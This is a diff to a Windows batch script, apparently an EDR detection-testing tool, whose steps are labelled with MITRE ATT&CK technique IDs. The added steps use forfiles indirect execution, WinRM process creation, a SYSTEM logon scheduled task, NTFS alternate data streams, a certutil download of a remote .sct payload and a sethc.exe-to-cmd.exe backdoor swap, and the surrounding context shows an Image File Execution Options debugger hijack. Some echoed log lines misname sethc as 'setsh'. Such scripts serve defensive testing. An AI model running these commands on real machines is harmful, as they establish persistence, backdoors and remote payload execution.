@@ -151,14 +151,37 @@ echo Command Excuted: rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
 
 timeout 5 
 
-timeout 5
+
+
 echo %time% %date% [+] T1158 - Hiding data in ADS
 echo "test123 > 12.txt
 echo "test" > 12.txt:12
 echo Execution Finished at %time% %date%
 echo Command Excuted: echo "test123 > 12.txt
 echo Command Excuted: echo "test123 > 12.txt
+
 timeout 5
+
+echo %time% %date% [+] T1202 - Indirect Command Execution
+start "" cmd /c forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
+timeout 5
+echo %time% %date% [+] T1028 - Testing Windows Remoting exec
+start "" cmd /c winrm qc -q 
+start "" cmd /c winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
+echo Execution Finished at %time% %date%
+echo Command Excuted: winrm qc -q 
+echo Command Excuted: winrm i c wmicimv2/Win32_Process @{CommandLine="calc"}
+timeout 5
+echo %time% %date% [+] T1053 - Adding Scheduled Task exec ONLOGON
+start "" cmd /c schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System" /f
+echo Execution Finished at %time% %date%
+echo Command Excuted: schtasks /create /tn "mysc" /tr C:\windows\system32\calc.exe /sc ONLOGON /ru "System"
+timeout 5
+
+
+
 echo %time% %date% [+] T1183 - Exec via File Execution Options
 
 start "" cmd /c REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "C:\windows\system32\calc.exe"
@@ -169,8 +192,11 @@ echo Execution Finished at %time% %date%
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v Debugger /d "calc.exe"
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\paint.exe" /v GlobalFlag /t REG_DWORD /d 512 
 echo Command Excuted: REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\paint.exe" /v MonitorProcess /d "calc.exe"
+
 timeout 5
-echo %time% %date% [+] T1096 - NTFS File Attributes
+
+echo %time% %date% [+]  T1564/004 - NTFS File Attributes
+echo https://attack.mitre.org/versions/v7/techniques/T1564/004/
 type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
 start "" cmd /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
 echo Execution Finished at %time% %date%
@@ -178,7 +204,15 @@ echo Command Excuted: type C:\windows\system32\cmd.exe > "123.txt:evil.exe"
 echo Command Excuted: certutil.exe -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/test.sct testADS.txt:test
 timeout 5
 
-
+echo %time% %date% [+] T1015- T1546/008 - Sethc replacement
+echo https://attack.mitre.org/versions/v7/techniques/T1546/008/
+copy /Y C:\windows\system32\sethc.exe C:\windows\system32\sethc.bac
+copy /Y C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe
+copy /Y C:\windows\system32\sethc.bac C:\windows\system32\sethc.exe
+echo Execution Finished at %time% %date%
+echo Command Excuted: C:\windows\system32\setsh.exe C:\windows\system32\setsh.bac
+echo Command Excuted: C:\windows\system32\cmd.exe C:\windows\system32\setsh.exe
+echo Command Excuted: C:\windows\system32\setsh.bac C:\windows\system32\setsh.exe
 
 
 timeout 5
@@ -308,6 +342,8 @@ echo %time% %date% [+] Testing Scriptrunner exec
 start "" cmd /c scriptrunner.exe -appvscript calc.exe   
 echo Execution Finished at %time% %date%
 echo Command Excuted: scriptrunner.exe -appvscript calc.exe
+
+
 
 timeout 5
 
